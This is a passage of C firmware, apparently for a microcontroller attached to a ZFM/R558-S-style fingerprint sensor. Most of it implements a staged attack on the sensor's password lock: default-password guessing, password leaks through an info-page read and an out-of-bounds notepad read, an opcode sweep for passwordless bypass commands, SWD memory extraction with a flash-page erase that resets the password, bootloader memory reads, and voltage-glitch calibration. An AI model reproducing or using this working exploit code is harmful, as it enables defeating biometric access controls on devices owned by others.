    for (size_t i = 0; i < n_addrs; i++) {
        uint32_t a = check_addrs[i];
        uint8_t chs = 0xFF;
        fp_sensor_status_t hst = fp_sensor_txn(t, a, FP_INS_HANDSHAKE,
                                               NULL, 0, NULL, 0, NULL, &chs, 28, true);
        bool factory_addr_ack = (hst == FP_SENSOR_OK && fp_sensor_has_last_ack() &&
                                 fp_sensor_last_ack_addr() == FP_FACTORY_ADDRESS);
        uint8_t c12 = 0xFF;
        bool set_ok = (fp_sensor_set_password(t, a, zero_pwd, &c12) == FP_SENSOR_OK && c12 == FP_CONF_OK);

        if ((hst == FP_SENSOR_OK && chs == FP_CONF_OK) || factory_addr_ack || set_ok) {
            uint32_t target = factory_addr_ack ? FP_FACTORY_ADDRESS : a;
            if (try_unlock_password(t, &target, zero_pwd, out) ||
                try_unlock_password(t, &target, ff_pwd, out)) {
                *addr_io = target;
                return true;
            }
        }
    }

    /* Also check 115200 & 9600 baud if `ResetDefaultPara()` / `RestSetting` switched ROM default baud! */
    if (s_hal->uart_raw_mode != NULL) {
        static const int alt_bauds[2] = { 115200, 9600 };
        for (size_t b = 0; b < 2u; b++) {
            if (!s_hal->uart_raw_mode(s_hal_ctx, alt_bauds[b], false)) {
                continue;
            }
            for (size_t i = 0; i < n_addrs; i++) {
                uint32_t a = check_addrs[i];
                uint8_t chs = 0xFF;
                fp_sensor_status_t hst = fp_sensor_txn(t, a, FP_INS_HANDSHAKE,
                                                       NULL, 0, NULL, 0, NULL, &chs, 24, true);
                bool fac_ack = (hst == FP_SENSOR_OK && fp_sensor_has_last_ack() &&
                                fp_sensor_last_ack_addr() == FP_FACTORY_ADDRESS);
                if ((hst == FP_SENSOR_OK && chs == FP_CONF_OK) || fac_ack) {
                    uint32_t target = fac_ack ? FP_FACTORY_ADDRESS : a;
                    if (try_unlock_password(t, &target, zero_pwd, out) ||
                        try_unlock_password(t, &target, ff_pwd, out)) {
                        /* Normalize BaudRate back to 57600 (WriteReg 0x0E reg=4 val=6) before returning! */
                        const uint8_t set_57600[2] = { 0x04, 0x06 };
                        uint8_t wc = 0xFF;
                        (void)fp_sensor_txn(t, target, 0x0Eu, set_57600, 2, NULL, 0, NULL, &wc, 60, true);
                        if (s_hal->power_cycle_gp3 != NULL) {
                            s_hal->power_cycle_gp3(s_hal_ctx, 60, 120);
                        }
                        else {
                            (void)s_hal->uart_raw_mode(s_hal_ctx, FP_UART_BAUD, false);
                        }
                        *addr_io = target;
                        return true;
                    }
                }
            }
        }
        (void)s_hal->uart_raw_mode(s_hal_ctx, FP_UART_BAUD, false);
    }
    return false;
}

/* Reads trailing ZFM data packets (PID 0x02 ... PID 0x08) following PS_ReadINFpage (0x16). */
static size_t recv_data_stream(const fp_transport_t *t, uint8_t *dst, size_t dst_cap, uint32_t timeout_ms) {
    size_t total = 0;
    size_t raw_len = 0;

    for (unsigned pkt_i = 0; pkt_i < 12 && total < dst_cap; pkt_i++) {
        while (raw_len < FP_PACKET_HEADER_LEN) {
            int r = t->read(t->ctx, s_rx_raw + raw_len, sizeof(s_rx_raw) - raw_len,
                            pkt_i == 0 ? timeout_ms : 25u);
            if (r <= 0) {
                return total;
            }
            raw_len += (size_t)r;
        }
        /* Sync on 0xEF 0x01 header */
        size_t sync = 0;
        while (sync + 1u < raw_len && !(s_rx_raw[sync] == 0xEF && s_rx_raw[sync + 1u] == 0x01)) {
            sync++;
        }
        if (sync > 0) {
            memmove(s_rx_raw, s_rx_raw + sync, raw_len - sync);
            raw_len -= sync;
            if (raw_len < FP_PACKET_HEADER_LEN) {
                continue;
            }
        }
        uint8_t pid = s_rx_raw[6];
        uint16_t plen = (uint16_t)(((uint16_t)s_rx_raw[7] << 8) | s_rx_raw[8]);
        if (plen < 2u || FP_PACKET_HEADER_LEN + plen > sizeof(s_rx_raw)) {
            return total;
        }
        size_t frame_total = FP_PACKET_HEADER_LEN + (size_t)plen;
        while (raw_len < frame_total) {
            int r = t->read(t->ctx, s_rx_raw + raw_len, sizeof(s_rx_raw) - raw_len, 25u);
            if (r <= 0) {
                return total;
            }
            raw_len += (size_t)r;
        }
        size_t data_n = (size_t)(plen - 2u);
        size_t copy_n = (total + data_n <= dst_cap) ? data_n : (dst_cap - total);
        memcpy(dst + total, s_rx_raw + FP_PACKET_HEADER_LEN, copy_n);
        total += copy_n;

        if (raw_len > frame_total) {
            memmove(s_rx_raw, s_rx_raw + frame_total, raw_len - frame_total);
            raw_len -= frame_total;
        }
        else {
            raw_len = 0;
        }
        if (pid == FP_PID_END_DATA) {
            break;
        }
    }
    return total;
}

/* Tests a 32-bit leaked word in BE, LE, and 16-bit halfword swap forms (max 3 VfyPwd packets). */
static bool try_leaked_word_variants(const fp_transport_t *t, uint32_t *addr_io,
                                     const uint8_t raw4[4], uint8_t *vfy_budget,
                                     fp_unlock_report_t *out) {
    const uint8_t variants[3][4] = {
        { raw4[0], raw4[1], raw4[2], raw4[3] },
        { raw4[3], raw4[2], raw4[1], raw4[0] },
        { raw4[1], raw4[0], raw4[3], raw4[2] },
    };
    for (size_t i = 0; i < 3; i++) {
        bool dup = false;
        for (size_t j = 0; j < i; j++) {
            if (memcmp(variants[i], variants[j], 4) == 0) {
                dup = true;
                break;
            }
        }
        if (dup) {
            continue;
        }
        if (*vfy_budget == 0) {
            return false;
        }
        (*vfy_budget)--;
        if (try_unlock_password(t, addr_io, variants[i], out)) {
            return true;
        }
    }
    return false;
}

/* Stage 1B: PS_ReadINFpage (0x16) 512B flash parameter extraction (Table 2-1: Password @ +0x3C). */
static bool stage_read_inf_leak(const fp_transport_t *t, uint32_t *addr_io,
                                uint8_t *vfy_budget, uint8_t *inf_conf_out,
                                fp_unlock_report_t *out) {
    memset(s_inf_buf, 0, sizeof(s_inf_buf));
    uint8_t c16 = 0xFF;
    uint8_t ack_pay[64];
    uint16_t ack_len = 0;

    fp_sensor_status_t st = fp_sensor_txn(t, *addr_io, FP_INS_READ_INF_PAGE,
                                          NULL, 0, ack_pay, sizeof(ack_pay), &ack_len, &c16, 45, true);
    if (st != FP_SENSOR_OK || c16 != FP_CONF_OK) {
        const uint8_t page0 = 0x00;
        uint8_t alt_c = 0xFF;
        if (fp_sensor_txn(t, *addr_io, FP_INS_READ_INF_PAGE,
                          &page0, 1, ack_pay, sizeof(ack_pay), &ack_len, &alt_c, 45, true) == FP_SENSOR_OK &&
            alt_c == FP_CONF_OK) {
            c16 = alt_c;
            st = FP_SENSOR_OK;
        }
    }
    *inf_conf_out = c16;
    if (st != FP_SENSOR_OK || c16 != FP_CONF_OK) {
        return false;
    }

    size_t got = recv_data_stream(t, s_inf_buf, sizeof(s_inf_buf), 80);
    if (got == 0 && ack_len > 1u) {
        got = (size_t)(ack_len - 1u);
        memcpy(s_inf_buf, ack_pay + 1, got);
    }
    if (got < 8u) {
        return false;
    }

    /* 1. Exact Table 2-1 offset 0x3C..0x3F (`DeviceAddress @ 0x08` + `0x34`). */
    if (got >= 0x40u && try_leaked_word_variants(t, addr_io, s_inf_buf + 0x3Cu, vfy_budget, out)) {
        return true;
    }

    /* 2. Locate exact `DeviceAddress` anywhere in `s_inf_buf` (BE or LE) and read `+0x34`. */
    uint8_t addr_be[4], addr_le[4];
    wr_be32(addr_be, *addr_io);
    wr_le32(addr_le, *addr_io);
    for (size_t off = 0; off + 4u <= got; off++) {
        if (memcmp(s_inf_buf + off, addr_be, 4) == 0 || memcmp(s_inf_buf + off, addr_le, 4) == 0) {
            if (off + 0x38u <= got &&
                try_leaked_word_variants(t, addr_io, s_inf_buf + off + 0x34u, vfy_budget, out)) {
                return true;
            }
            if (off + 8u <= got &&
                try_leaked_word_variants(t, addr_io, s_inf_buf + off + 4u, vfy_budget, out)) {
                return true;
            }
        }
    }
    return false;
}

/* Stage 3A: PS_ReadNotepad (0x19) signed `int8_t page` out-of-bounds Flash reader (`pages 0xFE..0x80`). */
static bool stage_read_notepad_oob(const fp_transport_t *t, uint32_t *addr_io,
                                   uint8_t *vfy_budget, uint8_t *np_conf_out,
                                   fp_unlock_report_t *out) {
    /*
     * When ParaTable sits immediately below Notepad in Flash, `int8_t page = -4 .. -1` (`0xFC..0xFF`)
     * indexes `NOTEPAD_BASE - 128 .. NOTEPAD_BASE - 32`, putting `DeviceAddress` at `-4` (`+0x08`)
     * and `Password` right inside page `-3` (`0xFD`, offset `0x1C..0x1F`) or `-2` (`0xFE`)!
     */
    static const uint8_t prio_pages[] = {
        0x00, 0xFD, 0xFE, 0xFC, 0xFF, 0xFB, 0xFA, 0xF9, 0xF8,
        0xF0, 0xE0, 0xC0, 0x80, 0x01, 0x10, 0x20
    };
    uint8_t dump[256];
    memset(dump, 0, sizeof(dump));
    bool any_ok = false;
    uint8_t first_conf = 0xFF;

    /* Read contiguous window [-6 .. -1] (`0xFA .. 0xFF`, 192 bytes) into `dump[0..191]`. */
    for (unsigned idx = 0; idx < 6u; idx++) {
        uint8_t pg = (uint8_t)(0xFAu + idx);
        uint8_t ack[48];
        uint16_t ack_len = 0;
        uint8_t c19 = 0xFF;
        if (fp_sensor_txn(t, *addr_io, FP_INS_READ_NOTEPAD, &pg, 1,
                          ack, sizeof(ack), &ack_len, &c19, 30, true) == FP_SENSOR_OK) {
            if (first_conf == 0xFF) {
                first_conf = c19;
            }
            if (c19 == FP_CONF_OK && ack_len >= 33u) {
                memcpy(dump + idx * 32u, ack + 1, 32u);
                any_ok = true;
            }
        }
    }

    if (any_ok) {
        uint8_t addr_be[4], addr_le[4];
        wr_be32(addr_be, *addr_io);
        wr_le32(addr_le, *addr_io);
        for (size_t off = 0; off + 4u <= 192u; off++) {
            if (memcmp(dump + off, addr_be, 4) == 0 || memcmp(dump + off, addr_le, 4) == 0) {
                if (off + 0x38u <= 192u &&
                    try_leaked_word_variants(t, addr_io, dump + off + 0x34u, vfy_budget, out)) {
                    *np_conf_out = FP_CONF_OK;
                    return true;
                }
            }
        }
    }

    for (size_t i = 0; i < sizeof(prio_pages); i++) {
        uint8_t pg = prio_pages[i];
        uint8_t ack[48];
        uint16_t ack_len = 0;
        uint8_t c19 = 0xFF;
        if (fp_sensor_txn(t, *addr_io, FP_INS_READ_NOTEPAD, &pg, 1,
                          ack, sizeof(ack), &ack_len, &c19, 25, true) == FP_SENSOR_OK) {
            if (first_conf == 0xFF || c19 == FP_CONF_OK) {
                first_conf = c19;
            }
            if (c19 == FP_CONF_OK && ack_len >= 5u && pg >= 0xFDu) {
                /* Direct hit in negative OOB page `-3` (`0xFD` + 0x1C): test candidate non-trivial words. */
                if (ack_len >= 33u) {
                    const uint8_t *cand = ack + 1u + 0x1Cu;
                    uint32_t w = rd_be32(cand);
                    if (w != 0u && w != 0xFFFFFFFFu &&
                        try_leaked_word_variants(t, addr_io, cand, vfy_budget, out)) {
                        *np_conf_out = FP_CONF_OK;
                        return true;
                    }
                }
            }
        }
    }

    *np_conf_out = first_conf;
    return false;
}

/* Stage 3B: Full 255-opcode non-VfyPwd ROM audit (`0x00..0xFF`, skipping `0x13` so vfy_count stays 0!). */
static void stage_audit_all_opcodes(const fp_transport_t *t, uint32_t *addr_io, fp_unlock_report_t *out) {
    s_open_ops[0] = '\0';
    unsigned open_cnt = 0;

    /* 1. Try raw hardware Aura LED (`0x40: 60 04 10 00` = Blue ON) first. */
    const uint8_t aura_blue[4] = { 0x60, 0x04, 0x10, 0x00 };
    uint8_t c40 = 0xFF;
    if (fp_sensor_txn(t, *addr_io, FP_INS_AURA_LED_RAW, aura_blue, sizeof(aura_blue),
                      NULL, 0, NULL, &c40, 20, true) == FP_SENSOR_OK &&
        c40 != 0x21 && c40 != FP_CONF_PACKET_ERR) {
        diag_appendf(s_open_ops, sizeof(s_open_ops), "%s40:%02X", open_cnt ? "," : "", c40);
        open_cnt++;
    }

    /* 2. Check §5 `za` passwordless compatibility opcodes explicitly (`0x53 GetEcho`). */
    if (fp_za_probe_echo(t, *addr_io)) {
        out->za_bypass_available = true;
        s_za_verified = true;
        diag_appendf(s_open_ops, sizeof(s_open_ops), "%s53:55", open_cnt ? "," : "");
        open_cnt++;
    }

    /* 3. Sweep remaining opcodes 0x00..0xFF (skipping 0x13 VfyPwd!) with fast timeout. */
    for (unsigned op = 0; op <= 0xFFu; op++) {
        if ((op & 0x0Fu) == 0u) {
            unlock_yield_wdt();
        }
        if (op == FP_INS_VFY_PWD || op == FP_INS_AURA_LED_RAW || op == FP_INS_ZA_GET_ECHO) {
            continue;
        }
        uint8_t conf = 0xFF;
        uint8_t pay[8] = { 0 };
        uint16_t plen = 0;
        if (op == FP_INS_SET_PWD) {
            plen = 4; /* zero_pwd */
        }
        else if (op == FP_INS_SET_CHIP_ADDR) {
            memset(pay, 0xFF, 4);
            plen = 4;
        }
        else if (op == FP_INS_ZA_AUTO_SEARCH || op == FP_INS_ZA_AUTO_SEARCH_ECHO ||
                 op == FP_INS_AUTO_ID) {
            pay[0] = 3;
            pay[1] = 0xFF;
            pay[2] = 0xFF;
            plen = 5;
        }
        else if (op == FP_INS_ZA_AUTO_LOGIN || op == FP_INS_ZA_AUTO_LOGIN_STAB ||
                 op == FP_INS_AUTO_ENROLL) {
            /* Probe search/echo opcodes cleanly without accidentally enrolling an empty finger! */
            continue;
        }
        fp_sensor_status_t st = fp_sensor_txn(t, *addr_io, (uint8_t)op,
                                              plen > 0 ? pay : NULL, plen,
                                              NULL, 0, NULL, &conf, 8, true);
        if (st == FP_SENSOR_TIMEOUT) {
            /* A timeout after valid prior ACKs means `op` entered an active wait state (un-gated!). */
            uint8_t tmp = 0xFF;
            (void)fp_sensor_txn(t, *addr_io, FP_INS_ZA_TERMINATE, NULL, 0, NULL, 0, NULL, &tmp, 12, true);
            (void)fp_sensor_txn(t, *addr_io, FP_INS_SOFT_RESET, NULL, 0, NULL, 0, NULL, &tmp, 12, true);
            (void)fp_sensor_txn(t, *addr_io, FP_INS_CANCEL, NULL, 0, NULL, 0, NULL, &tmp, 12, true);
            uint8_t hs = 0xFF;
            if (fp_sensor_txn(t, *addr_io, FP_INS_HANDSHAKE, NULL, 0, NULL, 0, NULL, &hs, 20, true) == FP_SENSOR_OK) {
                if (op == FP_INS_ZA_AUTO_LOGIN || op == FP_INS_ZA_AUTO_SEARCH ||
                    op == FP_INS_ZA_AUTO_LOGIN_STAB || op == FP_INS_ZA_AUTO_SEARCH_ECHO) {
                    out->za_bypass_available = true;
                    s_za_verified = true;
                }
                if (open_cnt < 6u) {
                    diag_appendf(s_open_ops, sizeof(s_open_ops), "%s%02X:WAIT", open_cnt ? "," : "", op);
                }
                open_cnt++;
            }
            continue;
        }
        if (st != FP_SENSOR_OK) {
            continue;
        }
        if (op == FP_INS_SET_PWD && conf == FP_CONF_OK) {
            const uint8_t zp[4] = { 0, 0, 0, 0 };
            if (try_unlock_password(t, addr_io, zp, out)) {
                return;
            }
        }
        if (op == FP_INS_REST_SETTING && conf == FP_CONF_OK) {
            unlock_sleep_ms(80);
            *addr_io = FP_FACTORY_ADDRESS;
            const uint8_t zp[4] = { 0, 0, 0, 0 };
            if (try_unlock_password(t, addr_io, zp, out)) {
                return;
            }
        }
        if (conf != 0x21 && conf != FP_CONF_WRONG_PWD && conf != FP_CONF_PACKET_ERR) {
            if ((op == FP_INS_ZA_AUTO_LOGIN || op == FP_INS_ZA_AUTO_SEARCH ||
                 op == FP_INS_ZA_AUTO_LOGIN_STAB) &&
                (conf == FP_CONF_OK || conf == FP_CONF_NO_FINGER || conf == FP_CONF_LIB_EMPTY || conf == FP_ZA_ECHO_OK)) {
                out->za_bypass_available = true;
                s_za_verified = true;
            }
            if (open_cnt < 6u) {
                diag_appendf(s_open_ops, sizeof(s_open_ops), "%s%02X:%02X", open_cnt ? "," : "", op, conf);
            }
            open_cnt++;
        }
    }
    if (open_cnt == 0u) {
        snprintf(s_open_ops, sizeof(s_open_ops), "NONE(255=21)");
    }
}

/* Stage 5: Non-destructive ARM ADIv5 SWD SRAM & Flash Password Extractor + ParaTable Page Erase. */
static bool stage_swd_extract_or_erase(const fp_transport_t *t, uint32_t *addr_io, fp_unlock_report_t *out) {
    if (s_hal->swd_connect == NULL || s_hal->swd_read32 == NULL) {
        return false;
    }
    uint32_t idcode = 0;
    if (!s_hal->swd_connect(s_hal_ctx, &idcode)) {
        return false;
    }
    out->swd_detected = true;
    out->swd_idcode = idcode;
    s_swd_last_idcode = idcode;

    const uint32_t target_le = *addr_io;
    const uint32_t target_be = ((target_le & 0x000000FFu) << 24) |
                               ((target_le & 0x0000FF00u) << 8) |
                               ((target_le & 0x00FF0000u) >> 8) |
                               ((target_le & 0xFF000000u) >> 24);

    typedef struct {
        uint32_t base;
        uint32_t size;
        bool is_flash;
    } mem_win_t;

    static const mem_win_t wins[] = {
        { 0x20000000u, 0x00005000u, false }, /* 20 KB SRAM: active parameter table + UART session */
        { 0x0800FC00u, 0x00000400u, true },  /* 64 KB Flash tail ParaTable */
        { 0x0801FC00u, 0x00000400u, true },  /* 128 KB Flash tail ParaTable */
        { 0x0800F000u, 0x00000C00u, true },  /* Upper 64 KB parameter sectors */
        { 0x0801F000u, 0x00000C00u, true },  /* Upper 128 KB parameter sectors */
        { 0x08003C00u, 0x00000800u, true },  /* Boot parameter sector */
    };

    uint32_t found_flash_page = 0;
    uint8_t budget = 12;

    for (size_t w = 0; w < sizeof(wins) / sizeof(wins[0]); w++) {
        unlock_yield_wdt();
        for (uint32_t off = 0; off < wins[w].size; off += 4u) {
            uint32_t val = 0;
            uint32_t cur = wins[w].base + off;
            if (!s_hal->swd_read32(s_hal_ctx, cur, &val)) {
                break;
            }
            if (val != target_le && val != target_be) {
                continue;
            }
            if (wins[w].is_flash && found_flash_page == 0u) {
                found_flash_page = cur & ~0x3FFu;
            }
            /* Read Table 2-1 Password at `DeviceAddress + 0x34` as well as adjacent struct fields `+4` / `-4`. */
            static const int32_t rel_offs[] = { 0x34, 0x04, -0x04, 0x30, 0x38 };
            for (size_t r = 0; r < sizeof(rel_offs) / sizeof(rel_offs[0]); r++) {
                uint32_t pw_word = 0;
                uint32_t pw_addr = (uint32_t)((int32_t)cur + rel_offs[r]);
                if (s_hal->swd_read32(s_hal_ctx, pw_addr, &pw_word) &&
                    pw_word != 0u && pw_word != 0xFFFFFFFFu) {
                    uint8_t raw4[4];
                    wr_le32(raw4, pw_word);
                    if (s_hal->power_cycle_gp3 != NULL && s_gp3_verified) {
                        s_hal->power_cycle_gp3(s_hal_ctx, 25, 65);
                    }
                    if (try_leaked_word_variants(t, addr_io, raw4, &budget, out)) {
                        return true;
                    }
                }
            }
        }
    }

    /*
     * If AHB-AP found the exact 1 KB ParaTable flash page (`found_flash_page`) containing `target_addr`,
     * erase ONLY that 1 KB parameter page via GD32/STM32 FMC (`0x40022000`) + system reset (`AIRCR`) so
     * ROM firmware regenerates factory defaults (`0xFFFFFFFF`, `pwd = 0`) while app code is untouched!
     */
    if (found_flash_page >= 0x08003C00u && s_hal->swd_write32 != NULL) {
        (void)s_hal->swd_write32(s_hal_ctx, 0x40022004u, 0x45670123u); /* FMC_KEYR 1 */
        (void)s_hal->swd_write32(s_hal_ctx, 0x40022004u, 0xCDEF89ABu); /* FMC_KEYR 2 */
        (void)s_hal->swd_write32(s_hal_ctx, 0x40022010u, 0x00000002u); /* FMC_CTL = PER */
        (void)s_hal->swd_write32(s_hal_ctx, 0x40022014u, found_flash_page);
        (void)s_hal->swd_write32(s_hal_ctx, 0x40022010u, 0x00000042u); /* FMC_CTL = PER | START */
        unlock_sleep_ms(30);
        (void)s_hal->swd_write32(s_hal_ctx, 0xE000ED0Cu, 0x05FA0004u); /* SCB->AIRCR SYSRESETREQ */
        unlock_sleep_ms(75);
        if (check_already_unlocked_or_glitch_hit(t, addr_io, out)) {
            return true;
        }
    }

    return false;
}

/* ------------------------------------------------------------------------- */
/* Stage 4: GP3 ISP Bootloader + Split-Packet Calibrator + Glitch Sweeps     */
/* ------------------------------------------------------------------------- */

static uint32_t effective_boot_settle_ms(uint32_t min_ms) {
    uint32_t need = s_boot_ms > 0u ? (s_boot_ms + 55u) : min_ms;
    return need > min_ms ? need : min_ms;
}

/* Split-Packet FSM Retention Oracle: returns true iff R558-S SRAM & UART FSM survived `width_cycles`. */
static bool split_packet_survived(uint32_t addr, uint32_t width_cycles) {
    if (s_hal->uart_write_raw == NULL || s_hal->uart_read_raw == NULL || s_hal->glitch_pulse == NULL) {
        return true;
    }
    uint8_t frame[16];
    size_t n = fp_sensor_encode_packet(frame, sizeof(frame), addr, FP_PID_COMMAND,
                                       (const uint8_t[]){ FP_INS_HANDSHAKE }, 1);
    if (n != 12u) {
        return true;
    }

    /* Drain stale RX bytes, send first 6 bytes (`EF 01 <addr>`), fire dual-rail pulse, send last 6 bytes! */
    uint8_t sink[32];
    (void)s_hal->uart_read_raw(s_hal_ctx, sink, sizeof(sink), 1);

    if (s_hal->uart_write_raw(s_hal_ctx, frame, 6u) != 0) {
        return false;
    }
    s_hal->glitch_pulse(s_hal_ctx, 250u, width_cycles, false);
    if (s_hal->uart_write_raw(s_hal_ctx, frame + 6u, 6u) != 0) {
        return false;
    }

    uint8_t rx[24];
    int got = s_hal->uart_read_raw(s_hal_ctx, rx, sizeof(rx), 16u);
    if (got >= 10) {
        for (int i = 0; i + 1 < got; i++) {
            if (rx[i] == 0xEF && rx[i + 1] == 0x01) {
                return true;
            }
        }
    }
    /* MCU POR reset occurred: wait FULL measured boot time so next binary-search step tests an awake chip! */
    unlock_sleep_ms(effective_boot_settle_ms(65u));
    return false;
}

static uint32_t calibrate_crit_cycles(uint32_t addr) {
    uint32_t lo = 120u;        /* 0.5 us @ 240 MHz */
    uint32_t hi = 3000000u;    /* 12.5 ms @ 240 MHz */

    /*
     * Try progressively smaller widths to find the actual POR threshold.
     * If 200c causes POR (UART FSM corruption or full reset), try 50c, then 20c.
     * If even 20c causes POR, the sensor is too sensitive — use the silicon constant.
     * This allows the sweep to use widths just below the actual POR threshold
     * instead of blindly firing at 568-639c (which would cause full POR resets).
     */
    uint32_t start = 200u;
    if (!split_packet_survived(addr, start)) {
        start = 50u;
        if (!split_packet_survived(addr, start)) {
            start = 20u;
            if (!split_packet_survived(addr, start)) {
                /* Even 20c causes POR — sensor too sensitive, preserve silicon constant */
                return s_crit_cycles > 0u ? s_crit_cycles : UNLOCK_SILICON_CRIT_CYCLES;
            }
        }
    }
    lo = start;

    uint32_t probe = start * 2u;
    while (probe < hi) {
        unlock_yield_wdt();
        if (!split_packet_survived(addr, probe)) {
            hi = probe;
            break;
        }
        lo = probe;
        probe *= 2u;
    }

    for (unsigned step = 0; step < 11u && (hi - lo) > 24u; step++) {
        unlock_yield_wdt();
        uint32_t mid = lo + (hi - lo) / 2u;
        if (split_packet_survived(addr, mid)) {
            lo = mid;
        }
        else {
            hi = mid;
        }
    }
    return hi;
}

/* Helper for safe non-destructive GD32/STM32 UART0 ISP Read Memory (`0x11 0xEE`). */
static bool isp_read_block_256(uint32_t mem_addr, uint8_t out256[256]) {
    const uint8_t cmd_rm[2] = { 0x11, 0xEE };
    uint8_t ack = 0;
    if (s_hal->uart_write_raw(s_hal_ctx, cmd_rm, 2) != 0 ||
        s_hal->uart_read_raw(s_hal_ctx, &ack, 1, 15) != 1 || ack != 0x79) {
        return false;
    }
    uint8_t abuf[5];
    abuf[0] = (uint8_t)(mem_addr >> 24);
    abuf[1] = (uint8_t)(mem_addr >> 16);
    abuf[2] = (uint8_t)(mem_addr >> 8);
    abuf[3] = (uint8_t)(mem_addr);
    abuf[4] = (uint8_t)(abuf[0] ^ abuf[1] ^ abuf[2] ^ abuf[3]);
    if (s_hal->uart_write_raw(s_hal_ctx, abuf, 5) != 0 ||
        s_hal->uart_read_raw(s_hal_ctx, &ack, 1, 15) != 1 || ack != 0x79) {
        return false;
    }
    const uint8_t len_pkt[2] = { 0xFF, 0x00 }; /* Read 256 bytes */
    if (s_hal->uart_write_raw(s_hal_ctx, len_pkt, 2) != 0 ||
        s_hal->uart_read_raw(s_hal_ctx, &ack, 1, 15) != 1 || ack != 0x79) {
        return false;
    }
    int total = 0;
    while (total < 256) {
        int r = s_hal->uart_read_raw(s_hal_ctx, out256 + total, (size_t)(256 - total), 35);
        if (r <= 0) {
            break;
        }
        total += r;
    }
    return total == 256;
}

/*
 * Safe non-destructive Cold-Boot GD32/STM32 8E1 UART0 ISP Reader (`0x7F -> 0x11 0xEE Read Memory`):
 * NEVER issues `0x92 0x6D` mass-erase so sensor application Flash can NEVER be wiped!
 */
static bool try_cold_boot_uart_isp(const fp_transport_t *t, uint32_t *addr_io, fp_unlock_report_t *out) {
    if (s_hal->power_cycle_gp3 == NULL || s_hal->uart_raw_mode == NULL ||
        s_hal->uart_write_raw == NULL || s_hal->uart_read_raw == NULL) {
        return false;
    }
    static const uint32_t isp_bases[] = {
        0x0800FC00u, 0x0801FC00u, 0x0800F800u, 0x0801F800u, 0x08003C00u, 0x20000000u
    };
    const int bauds[2] = { 115200, 57600 };
    uint8_t page_buf[256];
    uint8_t addr_be[4], addr_le[4];
    wr_be32(addr_be, *addr_io);
    wr_le32(addr_le, *addr_io);

    /* 1A. Probe 0..48.5 ms first-stage ROM/Flash UART bootloader in 8N1 mode (break + banner + ZFM boot cmds). */
    for (size_t b = 0; b < 2u; b++) {
        s_hal->power_cycle_gp3(s_hal_ctx, 70, 0);
        if (!s_hal->uart_raw_mode(s_hal_ctx, bauds[b], false)) {
            continue;
        }
        const uint8_t brk[2] = { 0x00, 0x7F };
        (void)s_hal->uart_write_raw(s_hal_ctx, brk, sizeof(brk));
        uint8_t banner[8] = { 0 };
        int bn = s_hal->uart_read_raw(s_hal_ctx, banner, sizeof(banner), 18);
        if (bn > 0 && s_bl_hex[0] == '\0') {
            for (int k = 0; k < bn && k < 4; k++) {
                diag_appendf(s_bl_hex, sizeof(s_bl_hex), "%02X", banner[k]);
            }
        }
        /* Check if bootloader mode unlocks `SetPwd(0)` / `RestSetting` at factory `0xFFFFFFFF`! */
        if (check_already_unlocked_or_glitch_hit(t, addr_io, out)) {
            (void)s_hal->uart_raw_mode(s_hal_ctx, FP_UART_BAUD, false);
            return true;
        }
    }

    /* 1B. Probe standard GD32 / STM32 8E1 UART0 ROM ISP (`0x7F -> 0x79` -> non-destructive `0x11 0xEE`). */
    for (size_t b = 0; b < 2u; b++) {
        s_hal->power_cycle_gp3(s_hal_ctx, 70, 0);
        if (!s_hal->uart_raw_mode(s_hal_ctx, bauds[b], true)) {
            continue;
        }
        const uint8_t sync = 0x7F;
        bool got_ack = false;
        for (unsigned attempt = 0; attempt < 8u; attempt++) {
            (void)s_hal->uart_write_raw(s_hal_ctx, &sync, 1);
            uint8_t rx = 0;
            if (s_hal->uart_read_raw(s_hal_ctx, &rx, 1, 5) == 1) {
                if (s_bl_hex[0] == '\0' && rx != 0x00) {
                    diag_appendf(s_bl_hex, sizeof(s_bl_hex), "%02X", rx);
                }
                if (rx == 0x79) {
                    got_ack = true;
                    break;
                }
            }
        }
        if (got_ack) {
            uint8_t cand_pw[4] = { 0 };
            bool found_pw = false;
            for (size_t k = 0; k < sizeof(isp_bases) / sizeof(isp_bases[0]) && !found_pw; k++) {
                for (uint32_t sub = 0; sub < 0x400u && !found_pw; sub += 256u) {
                    if (!isp_read_block_256(isp_bases[k] + sub, page_buf)) {
                        break;
                    }
                    for (size_t off = 0; off + 0x38u <= 256u; off += 4u) {
                        if (memcmp(page_buf + off, addr_be, 4) == 0 ||
                            memcmp(page_buf + off, addr_le, 4) == 0) {
                            memcpy(cand_pw, page_buf + off + 0x34u, 4);
                            found_pw = true;
                            break;
                        }
                    }
                }
            }
            (void)s_hal->uart_raw_mode(s_hal_ctx, FP_UART_BAUD, false);
            s_hal->power_cycle_gp3(s_hal_ctx, 75, effective_boot_settle_ms(220u));
            if (found_pw) {
                uint8_t budget = 4u;
                if (try_leaked_word_variants(t, addr_io, cand_pw, &budget, out)) {
                    return true;
                }
            }
        }
    }
    (void)s_hal->uart_raw_mode(s_hal_ctx, FP_UART_BAUD, false);
    s_hal->power_cycle_gp3(s_hal_ctx, 75, effective_boot_settle_ms(220u));
    return false;
}

/* ------------------------------------------------------------------------- */
/* §5 `za` Passwordless Compatibility Engine (`0x53 / 0x54 / 0x55 / 0xAA`)   */
/* ------------------------------------------------------------------------- */

bool fp_za_probe_echo(const fp_transport_t *t, uint32_t addr) {
    uint8_t conf = 0xFF;
    fp_sensor_status_t st = fp_sensor_txn(t, addr, FP_INS_ZA_GET_ECHO,
                                          NULL, 0, NULL, 0, NULL, &conf, 35, false);
    return st == FP_SENSOR_OK && (conf == FP_ZA_ECHO_OK || conf == FP_CONF_OK);
}

fp_result_t fp_za_enroll_finger(const fp_transport_t *t, uint32_t addr, uint16_t slot, uint8_t entries,
                                volatile bool *cancel_flag, volatile bool *waiting_flag,
                                uint8_t *err_ins, uint8_t *err_conf) {
    /* Try Aura LED blue on hardware before starting `za` AutoLogin (0x54). */
    const uint8_t aura_blue[4] = { 0x60, 0x04, 0x10, 0x00 };
    uint8_t dummy = 0xFF;
    (void)fp_sensor_txn(t, addr, FP_INS_AURA_LED_RAW, aura_blue, sizeof(aura_blue),
                        NULL, 0, NULL, &dummy, 20, false);

    /*
     * OEM §5 `za` PS_AutoLogin (0x54) & R558-S PS_AutoEnroll (0x31) share the 5-byte payload:
     * [ID_H, ID_L, Entries, ParamH, ParamL] where bit3=1 allows slot overwrite.
     */
    const uint8_t params[5] = {
        (uint8_t)(slot >> 8),
        (uint8_t)(slot & 0xFF),
        entries > 0 ? entries : 2u,
        0x00,
        0x08
    };
    fp_sensor_status_t st = fp_sensor_send_cmd(t, addr, FP_INS_ZA_AUTO_LOGIN, params, sizeof(params));
    if (st != FP_SENSOR_OK) {
